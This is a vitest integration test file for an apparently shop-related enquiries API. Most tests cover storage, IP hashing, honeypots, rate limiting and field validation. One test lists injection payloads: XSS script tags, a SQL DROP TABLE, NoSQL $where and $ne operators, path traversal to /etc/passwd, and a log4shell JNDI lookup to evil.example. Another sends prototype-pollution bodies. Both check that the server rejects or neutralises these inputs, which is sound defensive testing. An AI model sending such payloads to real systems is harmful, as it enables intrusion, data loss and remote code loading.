import { ObjectId } from 'mongodb';
import { afterAll, beforeAll, beforeEach, describe, expect, it } from 'vitest';
import { expectError, expectSiteDataIntact } from '../../support/assertions.js';
import { createHarness, type Harness } from '../../support/harness.js';

let h: Harness;

beforeAll(async () => {
  h = await createHarness();
}, 120_000);

afterAll(async () => {
  await expectSiteDataIntact(h);
  await h.close();
});

beforeEach(() => {
  h.clock.reset();
});

const enquiries = () => h.db.collection('app_enquiries');
const count = () => enquiries().countDocuments({});

const contact = (overrides: Record<string, unknown> = {}): Record<string, unknown> => ({
  type: 'contact',
  name: 'Asha Patel',
  email: 'asha@example.com',
  message: 'Do you deliver to Leeds on Saturdays?',
  ...overrides,
});

const send = (body: unknown, ip?: string) => h.post('/v1/enquiries', body, ip === undefined ? {} : { ip });

describe('POST /v1/enquiries', () => {
  it('stores a contact enquiry and answers 202 with its id', async () => {
    const before = await count();
    const res = await send(contact(), '198.51.100.1');
    expect(res.status, res.text).toBe(202);
    const { id } = res.json<{ id: string }>();
    expect(id).toMatch(/^[0-9a-f]{24}$/);
    expect(Object.keys(res.json()).sort()).toEqual(['id']);
    expect(await count()).toBe(before + 1);

    const doc = await enquiries().findOne({ _id: new ObjectId(id) });
    expect(doc).toMatchObject({
      type: 'contact',
      name: 'Asha Patel',
      email: 'asha@example.com',
      message: 'Do you deliver to Leeds on Saturdays?',
      status: 'new',
      createdAt: h.clock.now(),
    });
    expect(Object.keys(doc ?? {}).sort()).toEqual(['_id', 'createdAt', 'email', 'ipHash', 'message', 'name', 'status', 'type']);
  });

  it('stores only a salted hash of the client IP, never the address', async () => {
    const ip = '198.51.100.77';
    const res = await send(contact({ message: 'Checking that the IP is hashed properly please' }), ip);
    expect(res.status).toBe(202);
    const doc = await enquiries().findOne({ message: 'Checking that the IP is hashed properly please' });
    expect(doc).not.toBeNull();
    expect(doc).not.toHaveProperty('ip');
    expect(doc?.['ipHash']).toEqual(expect.stringMatching(/^[0-9a-f]{16,}$/));
    expect(JSON.stringify(doc)).not.toContain(ip);
    expect(res.text).not.toContain(doc?.['ipHash'] as string);
    // The hash is stable per IP (so rate limiting/abuse review works) and differs between IPs.
    await send(contact({ message: 'Second message from the same address' }), ip);
    await send(contact({ message: 'Message from a different address' }), '198.51.100.78');
    const same = await enquiries().find({ message: { $in: ['Checking that the IP is hashed properly please', 'Second message from the same address'] } }).toArray();
    expect(new Set(same.map((d) => d['ipHash'] as unknown)).size).toBe(1);
    const other = await enquiries().findOne({ message: 'Message from a different address' });
    expect(other?.['ipHash']).not.toBe(same[0]?.['ipHash']);
  });

  it('stores b2b and sales-rep enquiries with their business details', async () => {
    const b2b = await send(
      { type: 'b2b', name: 'Raj Shah', email: 'raj@shop.example', phone: '020 7946 0958', business: { name: 'Shah Stores', type: 'Retail' }, message: 'We would like wholesale pricing please.' },
    );
    expect(b2b.status, b2b.text).toBe(202);
    const rep = await send({ type: 'sales-rep', name: 'Lee Kim', email: 'lee@rep.example', phone: '07700 900555', message: 'I would like to represent Humi in the north.' });
    expect(rep.status, rep.text).toBe(202);
    expect(await enquiries().findOne({ type: 'b2b', email: 'raj@shop.example' })).toMatchObject({ business: { name: 'Shah Stores', type: 'Retail' }, phone: '020 7946 0958' });
  });

  it('silently drops honeypot submissions: 202 with a decoy id that matches nothing', async () => {
    const before = await count();
    const res = await send(contact({ website: 'http://spam.example', message: 'Buy cheap pills at my site now' }), '198.51.100.20');
    expect(res.status).toBe(202);
    const { id } = res.json<{ id: string }>();
    expect(id).toMatch(/^[0-9a-f]{24}$/);
    expect(await count()).toBe(before);
    expect(await enquiries().countDocuments({ message: 'Buy cheap pills at my site now' })).toBe(0);
    // An empty honeypot is a normal submission and the field is never stored.
    expect((await send(contact({ website: '', message: 'A perfectly normal message here' }), '198.51.100.21')).status).toBe(202);
    expect(await enquiries().findOne({ message: 'A perfectly normal message here' })).not.toHaveProperty('website');
  });

  it('suppresses duplicates from the same client within the window, but not from others or different text', async () => {
    const ip = '198.51.100.30';
    const message = 'Please call me about a large catering order';
    const before = await count();
    const first = await send(contact({ message }), ip);
    const second = await send(contact({ message }), ip);
    const shouty = await send(contact({ message: message.toUpperCase().replace(/ /g, '   ') }), ip);
    expect([first.status, second.status, shouty.status]).toEqual([202, 202, 202]);
    expect(await count()).toBe(before + 1);
    // The suppressed responses still carry well-formed ids (indistinguishable to the sender).
    expect(second.json<{ id: string }>().id).toMatch(/^[0-9a-f]{24}$/);
    expect(second.json<{ id: string }>().id).not.toBe(first.json<{ id: string }>().id);

    await send(contact({ message }), '198.51.100.31');
    expect(await count()).toBe(before + 2);
    await send(contact({ message: 'A completely different message from the same IP' }), ip);
    expect(await count()).toBe(before + 3);

    // Once the window has passed the same text is accepted again.
    h.clock.advanceMinutes(11);
    await send(contact({ message }), ip);
    expect(await count()).toBe(before + 4);
  });

  it('rate limits to 5 per hour per IP (429 + Retry-After), counting every attempt, and recovers', async () => {
    const ip = '198.51.100.40';
    const statuses: number[] = [];
    for (let i = 0; i < 5; i += 1) statuses.push((await send(contact({ message: `Rate limit probe number ${String(i)} here` }), ip)).status);
    expect(statuses).toEqual([202, 202, 202, 202, 202]);
    const before = await count();
    const limited = await send(contact({ message: 'Rate limit probe number six here' }), ip);
    expectError(limited, 429, 'rate_limited');
    expect(Number(limited.headers.get('retry-after'))).toBeGreaterThan(0);
    expect(await count()).toBe(before);
    expect((await send(contact({ message: 'A different client is not affected' }), '198.51.100.41')).status).toBe(202);
    h.clock.advanceMinutes(61);
    expect((await send(contact({ message: 'After the hour the client may write again' }), ip)).status).toBe(202);
  });

  it('counts invalid and honeypot attempts against the budget as well', async () => {
    const ip = '198.51.100.50';
    await send({}, ip);
    await send(contact({ website: 'x' }), ip);
    await send(contact({ email: 'nope' }), ip);
    await send(contact({ name: '' }), ip);
    await send(contact({ message: 'short' }), ip);
    expectError(await send(contact(), ip), 429, 'rate_limited');
  });

  it('stores injection payloads as inert text', async () => {
    const payloads = [
      '<script>alert(1)</script> and some more text',
      `'; DROP TABLE orders; -- and more text here`,
      '{"$where":"sleep(5000)"} plus padding text',
      '{"$ne":null} {"$gt":""} more padding',
      '`${process.exit(1)}` template injection text',
      '../../../../etc/passwd file traversal text',
      '${jndi:ldap://evil.example/a} log4shell text',
      'Robert\'); db.orders.drop();// bobby tables',
      '<img src=x onerror=alert(1)> html text here',
      '$set: {"payment_status":"payment-success"} text',
    ];
    const ordersBefore = await h.countOrders();
    const productsBefore = await h.db.collection('products').countDocuments({});
    for (const [index, message] of payloads.entries()) {
      const res = await send(contact({ name: `Tester ${String(index)}`, message }), `198.51.101.${String(index + 1)}`);
      expect(res.status, `${message}: ${res.text}`).toBe(202);
      const stored = await enquiries().findOne({ name: `Tester ${String(index)}` });
      expect(stored?.['message']).toBe(message); // stored verbatim, as a plain string
      expect(typeof stored?.['message']).toBe('string');
    }
    expect(await h.countOrders()).toBe(ordersBefore);
    expect(await h.db.collection('products').countDocuments({})).toBe(productsBefore);
    expect(await h.db.collection('orders').countDocuments({ payment_status: 'payment-success', 'app_meta.source': 'mobile-app' })).toBe(0);
  });

  it('refuses operator objects, prototype keys and unknown fields without storing anything', async () => {
    const before = await count();
    const bodies: unknown[] = [
      contact({ name: { $ne: null } }),
      contact({ email: { $gt: '' } }),
      contact({ message: { $where: 'sleep(1000)' } }),
      JSON.parse('{"type":"contact","name":"Ab","email":"a@b.co","message":"long enough message","__proto__":{"admin":true}}') as unknown,
      contact({ constructor: { prototype: { x: 1 } } }),
      contact({ isAdmin: true }),
      contact({ type: 'other' }),
      contact({ type: { $ne: 'x' } }),
      [contact()],
      'a string',
      null,
    ];
    for (const [index, body] of bodies.entries()) {
      const res = await send(body, `198.51.102.${String(index + 1)}`);
      expect(res.status, JSON.stringify(body)).toBe(400);
      expectError(res, 400);
    }
    expect(await count()).toBe(before);
    expect(({} as Record<string, unknown>)['admin']).toBeUndefined();
  });

  it('rejects control characters, bidi overrides and zero-width characters', async () => {
    const before = await count();
    for (const [index, message] of ['bad\u0000nul in the message', 'rtl ‮override in the message', 'zero​width in the message', 'bell\u0007 in the message'].entries()) {
      expect((await send(contact({ message }), `198.51.103.${String(index + 1)}`)).status).toBe(400);
    }
    expect((await send(contact({ name: 'Line\nBreak' }), '198.51.103.50')).status).toBe(400);
    expect(await count()).toBe(before);
  });

  it('enforces field length limits and email/phone formats', async () => {
    const before = await count();
    const bad: Record<string, unknown>[] = [
      { message: 'm'.repeat(2001) },
      { message: 'short' },
      { name: 'x' },
      { name: 'n'.repeat(81) },
      { email: 'a'.repeat(250) + '@example.com' },
      { email: 'two@@example.com' },
      { email: 'a b@example.com' },
      { phone: '123' },
      { phone: 'not a phone' },
    ];
    for (const [index, overrides] of bad.entries()) {
      expect((await send(contact(overrides), `198.51.104.${String(index + 1)}`)).status, JSON.stringify(overrides).slice(0, 80)).toBe(400);
    }
    expect(await count()).toBe(before);
    expect((await send(contact({ message: 'm'.repeat(2000) }), '198.51.104.99')).status).toBe(202);
  });

  it('never touches the orders or products collections', async () => {
    expect(await h.siteOrdersNow()).toEqual(h.seededOrderHashes());
    expect(await h.countOrders()).toBe(h.seededOrderHashes().size);
  });
});
